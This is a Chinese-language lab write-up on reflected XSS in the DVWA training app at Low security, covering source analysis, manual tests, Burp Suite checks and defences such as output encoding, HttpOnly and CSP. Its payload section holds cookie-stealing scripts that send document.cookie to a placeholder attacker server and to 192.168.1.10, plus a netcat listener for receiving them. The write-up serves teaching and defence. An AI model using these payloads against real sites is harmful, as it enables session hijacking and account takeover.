# DVWA XSS (Reflected) Low 通关 WriteUp

## 一、漏洞概述

**反射型 XSS（Reflected XSS）** 是最常见的 XSS 类型。它的特点是：恶意脚本作为请求的一部分发送给服务器，服务器未经处理直接将其“反射”回响应页面，浏览器随后执行这段脚本。

与存储型 XSS 的区别在于：

- **反射型**：脚本不存储在服务器上，只存在于一次请求-响应中，需要诱导受害者点击恶意链接才能触发。
- **存储型**：脚本被永久存储在服务器（如数据库、留言板）中，任何访问该页面的用户都会中招。

将 DVWA 安全级别设置为 **Low**，进入 **XSS (Reflected)** 模块。

## 二、源码分析

查看 Low 级别源码：

```php
<?php
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    echo '<pre>Hello ' . $_GET['name'] . '</pre>';
}
?>
```

关键点：

1. `name` 参数通过 **GET** 方式提交。
2. 参数未经过任何过滤、转义或编码，直接拼接到 HTML 输出中。
3. 用户输入被当作 HTML 的一部分解析，因此可以注入 `<script>` 标签。

## 三、手工测试流程

### 1\. 正常输入

在输入框中提交：

```text
test
```

页面返回：

```html
<pre>Hello test</pre>
```

### 2\. 测试 HTML 注入

提交：

```html
<b>hello</b>
```

页面返回：

```html
<pre>Hello <b>hello</b></pre>
```

浏览器将 `<b>` 解析为加粗标签，说明 HTML 标签被正常执行，注入点存在。

### 3\. 测试脚本执行

提交：

```html
<script>alert('XSS')</script>
```

页面立即弹出一个内容为 `XSS` 的对话框，说明反射型 XSS 漏洞确认存在。

### 4\. 查看页面源码

右键查看页面源代码，可以看到：

```html
<pre>Hello <script>alert('XSS')</script></pre>
```

脚本被原样输出到 HTML 中，浏览器在解析时执行了它。

## 四、常用 Payload 与利用方式

### 1\. 基础弹窗

```html
<script>alert(document.cookie)</script>
```

用于查看当前站点的 Cookie，判断是否存在 HttpOnly 保护。

### 2\. 图片加载失败触发

```html
<img src=x onerror=alert('XSS')>
```

某些场景下 `<script>` 标签可能被过滤，但 `onerror` 事件属性仍可执行。

### 3\. 页面跳转

```html
<script>window.location='http://攻击者服务器/'</script>
```

诱导用户跳转到钓鱼页面。

### 4\. 窃取 Cookie

```html
<script>
new Image().src='http://攻击者服务器/steal?c='+document.cookie;
</script>
```

将受害者 Cookie 发送到攻击者服务器。实际利用时需要搭建一个接收端（如 `nc -lvp 80` 或简单的 HTTP 服务）。

### 5\. URL 编码传递

由于反射型 XSS 需要通过 URL 传递 Payload，某些字符在 URL 中需要编码。例如：

```text
http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

浏览器会自动对部分字符进行编码，也可以手动编码：

```text
?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### 6\. 构造完整攻击链

攻击者可以将恶意 URL 发送给受害者：

```text
http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
```

受害者点击后，Cookie 会被发送到攻击者服务器。攻击者拿到 `PHPSESSID` 后即可伪造会话，登录受害者的 DVWA 账号。

## 五、Burp Suite 验证

由于 URL 中直接传递脚本可能被浏览器编码，可以用 Burp Suite 的 Repeater 进行验证：

1. 拦截请求：
   ```http
    GET /dvwa/vulnerabilities/xss_r/?name=test&Submit=Submit HTTP/1.1
    Host: 靶机IP
    Cookie: PHPSESSID=...; security=low
   ```
2. 将 `name` 参数改为：
   ```text
    name=<script>alert(1)</script>
   ```
3. 发送请求，查看响应体中是否原样包含 `<script>alert(1)</script>`。

## 六、漏洞成因与防御

**成因**：用户输入未经过任何转义或编码，直接拼接到 HTML 输出中，导致浏览器将其解析为 HTML/JavaScript 代码。

**防御措施**：

1. **输出编码（首选）**  
   根据输出位置进行对应的编码：
   ```php
    // HTML 上下文
    echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
   ```

    `htmlspecialchars()` 会将 `<`、`>`、`"`、`'`、`&` 转换为 HTML 实体，使浏览器不再解析为标签。
2. **输入验证**  
   对用户输入进行白名单校验，例如只允许字母、数字、空格等。
3. **设置 Cookie 的 HttpOnly 属性**  
   防止 JavaScript 通过 `document.cookie` 读取会话 Cookie：
   ```php
    session_set_cookie_params(['httponly' => true]);
   ```
4. **内容安全策略（CSP）**  
   通过 HTTP 响应头限制脚本来源：
   ```text
    Content-Security-Policy: default-src 'self'
   ```
5. **避免直接拼接用户输入**  
   尽量使用安全的模板引擎，避免手工拼接 HTML。

## 七、总结

反射型 XSS 的核心在于：

- 用户输入被原样输出到页面；
- 浏览器将其解析为脚本执行；
- 攻击者通过构造恶意 URL 诱导受害者点击。

Low 级别没有任何过滤，是最直观的练习场景。理解它的成因与利用方式后，再学习 Medium 和 High 的绕过技巧，就能逐步掌握 XSS 的完整攻防思路。